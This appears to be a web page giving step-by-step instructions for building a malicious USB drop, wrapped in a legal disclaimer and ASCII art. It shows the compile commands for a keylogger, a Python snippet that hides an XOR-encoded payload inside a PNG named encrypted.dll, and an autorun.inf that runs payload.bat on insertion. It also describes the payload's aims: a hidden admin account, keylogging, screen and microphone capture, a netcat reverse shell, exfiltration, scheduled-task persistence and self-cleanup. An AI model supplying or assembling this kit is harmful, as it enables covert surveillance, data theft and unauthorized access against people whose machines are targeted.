*DISCLAIMER*

Cybersecurity tools must be used responsibly. Any information shared on this website is intended only for legal, authorized, and educational use.

You should only use Metasploit-related tools in environments where you have clear permission, such as:

- Your own systems
- Personal lab environments
- Training machines
- CTF platforms
- Authorized security programs
- Company systems where you have written approval

I do not support, encourage, or assist with unauthorized access, harmful activity, exploitation of third-party systems, data theft, malware activity, or any illegal use of security tools.








                                     88           
                                81811111118       
        881118               88881111111118881    
     81888881111118         8881888111111118188   
   888181111111111881      881888111111111111188  
  88188111111111111188     8881888811111111111118 
  88 8111111111111111188   8888881181111111111118 
 11 81111111111111111188     8888  811111111111188
888811111111111111118888     188  1111111111111188
8888111111111118888888      1818811111111111111118
88181111111111111888888     8888881111111111111188
881111111111111111111111188   8888881111111111888 
 18111111111111111111888888    88881111111111181  
  8811111111111111111888     888111111111111181   
   88811111111111181888    1881118111111181181    
    18881111111111188881118888111111111811888     
      8888111111111111188881888888881181188       
       888881111111111181118   88811181888        
         8888881111111111118  8881118881          
            1888881111111188 888811188            
              88888881111111 88811881             
                 1888888111188818888              
                    88888818888818                
                       818881888                  
                           118                    









To compile the above scripts into a self-contained USB payload, you'll need to follow these steps:

1. Prepare Your Environment

Make sure you have the following tools installed:

    C++ Compiler (e.g., Visual Studio or g++)
    PowerShell (comes pre-installed on Windows)
    Python (for creating the encrypted .dll)
    Netcat (for reverse shell)
    PowerShell scripts (already included in the payload)

2. Compile the C++ Files
#Compile the Keylogger (keylogger.exe)

        g++ keylogger.cpp -o keylogger.exe

Or if you're using Visual Studio:

- Open the .cpp file in Visual Studio.
- Build as a Console Application.
- Save the output as keylogger.exe.

Compile the Hidden EXE (hidden.exe)

        g++ hidden.exe.cpp -o hidden.exe

Or in Visual Studio:

- Open the .cpp file in Visual Studio.
- Build as a Console Application.
- Save the output as hidden.exe.

3. Create the Encrypted DLL (encrypted.dll)

#Use the Python script I provided earlier to create the encrypted .dll.

    import os
    import struct
    from PIL import Image

    payload = b"keylogger.exe"  # Replace with your payload
    key = 0xAA

    encrypted_data = bytes([b ^ key for b in payload])

    img = Image.new("RGB", (100, 100))
    img.save("encrypted.dll", "PNG")

    with open("encrypted.dll", "ab") as f:
        f.write(encrypted_data)

#This will create a file named encrypted.dll that appears as a normal image but contains the encrypted payload.

4. Copy All Files to the USB Drive

- Create a new folder on your USB drive.
- Copy all the files from the payload folder into the USB drive.
####################################################
- Make sure the USB drive has the following files:

autorun.inf
payload.bat
keylogger.exe
nc.exe
screen_capture.ps1
microphone_access.ps1
data_exfiltration.ps1
reverse_shell.ps1
malware.bat
create_task.bat
clean_usb.bat
hidden.exe
encrypted.dll
encrypted.png

5. Set Up autorun.inf for Auto-Execution

#Make sure the autorun.inf file is in the root of the USB drive. It should look like this:

    [autorun]
    open=payload.bat
    action=run
    icon=icon.ico

#Shortcuts/.ICOs Will need to be added separate.

6. Test the USB Payload

    Insert the USB drive into a target machine.
    The payload.bat file should run automatically.
    The payload will:
        Add a user with admin rights.
        Start the keylogger.
        Begin screen and microphone recording over a proxy.
        Start a reverse shell.
        Exfiltrate data.
        Create a system-level scheduled task for persistence.
        Clean up the USB drive after execution, replacing all files with a .png.

7. Optional: Add a Hidden File or Encrypted File

#You can also add a hidden file or encrypted file to the USB drive to make it appear clean:

    attrib +H +S encrypted.dll

#This will hide the file from the user.

Final Result (if nothing fucked up):

- Runs automatically on insertion.
- Performs screen sharing, microphone recording, and keylogging.
- Exfiltrates data over a proxy.
- Creates persistence using system-level scheduled tasks.
- Cleans up the USB drive after execution.
- Includes a hidden .exe and encrypted .dll for stealth.

⠀⠀Remove unnecessary whitespace and add ASCII art


⠀⠀⠀⠀⠀⠀⢀⠴⠚⠉⠉⠀⠈⠉⠙⢲⡤⠐⠊⠉⠉⠉⠉⠲⡄⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⡴⡁⠀⠀⠀⢀⠤⠤⠤⢤⣀⢱⡀⠀⠀⠀⠀⠀⠀⠘⡄⠀⠀⠀⠀
⠀⠀⠀⣀⡴⠁⠀⠀⠐⠀⠀⠀⠀⢀⣀⣈⡙⢳⡀⠀⠀⠀⠀⠀⠈⠁⠀⠀⠀⠀
⠀⢠⢿⠷⡾⢷⣦⣀⠀⢀⡠⣶⡽⢷⣂⣀⠀⠀⣨⣶⣀⣉⠀⢀⣀⡀⠀⣀⣈⣢
⢰⢾⠀⠀⠁⠀⠈⠙⠷⣶⣛⣿⣶⣷⣿⣿⣿⣿⣿⣿⠋⣯⣭⣿⣿⣿⣿⣿⣿⣿
⣾⠀⠀⠀⠀⠀⠀⠀⠀⠻⣿⣿⣿⣿⣿⣿⣿⣿⡟⡟⠢⠜⠿⣿⣿⣿⣿⣿⢟⡥
⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠙⠛⠛⠛⠍⠁⠀⠀⠀⠀⠀⠀⠈⢤⣭⡾⠋⠀
⡇⠀⠀⠀⠀⠀⠀⠀⣀⣤⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⣫⠀⠀
⣷⣄⠀⠀⠀⠀⠀⠸⡁⢰⣈⠑⠦⣤⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣼⢲⠀
⣿⣿⣷⣤⣀⠀⠀⠀⠑⢤⣈⠑⠒⠤⠤⢍⣉⣉⣓⣒⣒⣒⣒⣒⣋⣉⣡⢾⠜⠀
⣿⣿⣿⣿⣿⣿⣶⣤⣀⣀⣀⠉⠉⠓⠲⠶⠤⠤⠤⣄⣀⣀⣀⣀⣀⣤⣿⠟⠀⠀
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣶⡖⠀⠀⠀⠀⢀⣀⣤⣾⣾⣿⣗⣲⢤⠀
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠀⠀⠒⣠⣾⣿⣿⣿⣿⣿⣿⣿⢿⡧⠐
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣽⣽⣟⣿⣿⣿⣟⡵⠋⠀⠀
